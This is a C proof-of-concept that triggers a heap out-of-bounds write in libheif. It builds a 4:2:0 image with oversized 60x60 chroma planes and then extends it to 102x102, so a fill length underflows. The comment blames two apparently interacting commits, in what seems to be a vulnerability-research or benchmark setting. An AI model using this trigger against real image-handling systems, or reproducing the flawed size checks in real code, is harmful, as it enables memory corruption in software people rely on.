/*
 * PoC: delocalized heap out-of-bounds write in libheif's HeifPixelImage.
 *
 * Reached entirely through the public C API (libheif/heif.h) with in-contract
 * input:
 *
 *   heif_image_create()                 - create a YCbCr 4:2:0 image (100x100)
 *   heif_image_add_plane()              - add the Y plane and oversized Cb/Cr planes
 *   heif_image_extend_to_size_fill_with_zero() - grow the image
 *
 * On the ORIGINAL maintenance batch this is safe: add_channel() rejects a Cb/Cr
 * plane whose size is not exactly the chroma-subsampled size, so the oversized
 * plane can never be built, and the program exits cleanly.
 *
 * On the RESULTING tree the defect emerges from the composition of two commits:
 *   - "Reject an undersized Cb/Cr plane (issue #1796)" relaxed add_channel() to
 *     reject only an *undersized* Cb/Cr plane, deferring the oversized case to the
 *     extend_to_size_with_zero() preflight;
 *   - "Reject shrink requests in extend_to_size_with_zero (GHSA-hqc2-cx5m-g6ff)"
 *     added a per-plane preflight that compares each plane's target extent against
 *     the extent its *logical* size implies, not against the plane's actual size,
 *     so it never notices an individually oversized chroma plane.
 *
 * Building the image with a 60x60 Cb/Cr plane (the chroma-subsampled size of a
 * 100x100 4:2:0 image is 50x50) and then growing to 102x102 maps the chroma target
 * to 51x51. The per-row right-edge fill then computes its memset length as
 * (subsampled_width - old_width) = (51 - 60), which underflows uint32_t to ~4 GB
 * and writes far past the end of the chroma plane. AddressSanitizer aborts.
 */

#include <libheif/heif.h>
#include <stdio.h>

int main(void)
{
    heif_image* img = NULL;

    heif_error err = heif_image_create(100, 100, heif_colorspace_YCbCr, heif_chroma_420, &img);
    if (err.code != heif_error_Ok || img == NULL) {
        fprintf(stderr, "heif_image_create failed: %s\n", err.message ? err.message : "?");
        return 0;
    }

    err = heif_image_add_plane(img, heif_channel_Y, 100, 100, 8);
    if (err.code != heif_error_Ok) {
        fprintf(stderr, "add Y plane failed: %s\n", err.message ? err.message : "?");
        heif_image_release(img);
        return 0;
    }

    /* The chroma-subsampled size of a 100x100 4:2:0 image is 50x50. We request 60x60,
       which covers (is not smaller than) that extent. On the original batch this is
       rejected; on the resulting tree it is accepted. */
    err = heif_image_add_plane(img, heif_channel_Cb, 60, 60, 8);
    if (err.code != heif_error_Ok) {
        fprintf(stderr, "add Cb plane rejected (tree is secure): %s\n", err.message ? err.message : "?");
        heif_image_release(img);
        return 0;
    }
    err = heif_image_add_plane(img, heif_channel_Cr, 60, 60, 8);
    if (err.code != heif_error_Ok) {
        fprintf(stderr, "add Cr plane rejected (tree is secure): %s\n", err.message ? err.message : "?");
        heif_image_release(img);
        return 0;
    }

    /* Grow the logical image. 102x102 maps the chroma target to 51x51, which is
       smaller than the 60x60 chroma planes actually hold -> fill-length underflow
       -> out-of-bounds write (AddressSanitizer aborts here on the resulting tree). */
    err = heif_image_extend_to_size_fill_with_zero(img, 102, 102);
    fprintf(stderr, "extend_to_size returned: %s\n", err.message ? err.message : "ok");

    heif_image_release(img);
    return 0;
}
